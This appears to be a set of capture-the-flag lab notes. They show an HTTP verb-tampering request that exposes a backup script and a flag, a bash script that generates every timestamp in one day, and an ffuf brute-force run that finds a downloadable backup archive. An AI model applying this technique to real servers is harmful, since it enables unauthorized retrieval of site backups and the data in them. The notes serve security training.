


```
POST /scripts/backup_every_17minutes.sh HTTP/1.1
Host: 10.13.37.11
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Sec-GPC: 1
Accept-Language: en-US,en
Accept-Encoding: gzip, deflate, br
Cookie: wordpress_test_cookie=WP+Cookie+check
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
```


```
HTTP/1.1 200 OK
Date: Wed, 19 Jun 2024 10:23:27 GMT
Server: Apache/2.4.29 (Ubuntu)
Last-Modified: Sat, 07 Dec 2019 01:02:50 GMT
ETag: "196-59912b8b37f2f"
Accept-Ranges: bytes
Content-Length: 406
Connection: close
Content-Type: text/x-sh



#!/bin/bash
#
# This script performs backups of production and development websites.
# Backups are done every 17 minutes.
#
# AKERVA{IKNoW###VeRbTamper!nG_==}
#

SAVE_DIR=/var/www/html/backups

while true
do
	ARCHIVE_NAME=backup_$(date +%Y%m%d%H%M%S)
	echo "Erasing old backups..."
	rm -rf $SAVE_DIR/*

	echo "Backuping..."
	zip -r $SAVE_DIR/$ARCHIVE_NAME /var/www/html/*

	echo "Done..."
	sleep 1020
done
```

```
date +%Y%m%d%H%M%S
	  YEARMONTHDAYHOURMINUTESECOND
```


script for trying to guess what the time is
```
kali@kali ~> cat chat2.sh
#!/bin/bash
test="20240620"
for hour in {00..23}; do
  for minute in {00..59}; do
    for second in {00..59}; do
      echo "$test$hour$minute$second"
    done
  done
done
```




```
kali@kali ~> ffuf -w listtobrute.txt -u http://10.13.37.11/backups/backup_FUZZ.zip

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.13.37.11/backups/backup_FUZZ.zip
 :: Wordlist         : FUZZ: /home/kali/listtobrute.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

20240620163215          [Status: 200, Size: 22071775, Words: 0, Lines: 0, Duration: 0ms]
:: Progress: [86400/86400] :: Job [1/1] :: 199 req/sec :: Duration: [0:07:29] :: Errors: 0 ::

```